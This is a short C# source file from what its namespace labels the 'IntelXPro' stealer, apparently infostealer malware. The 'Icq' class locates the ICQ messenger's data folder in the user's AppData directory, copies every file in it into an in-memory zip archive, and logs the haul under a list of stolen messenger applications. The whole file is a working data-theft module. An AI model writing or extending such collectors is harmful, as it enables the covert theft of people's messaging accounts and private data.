using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Icq : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ICQ", "0001");
            if (Directory.Exists(text))
            {
                string text2 = "ICQ\\0001";
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "ICQ";
                zip.AddDirectoryFiles(text, text2);
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add(text2);
                counter.Messangers.Add(counterApplications);
            }
        }
    }

}
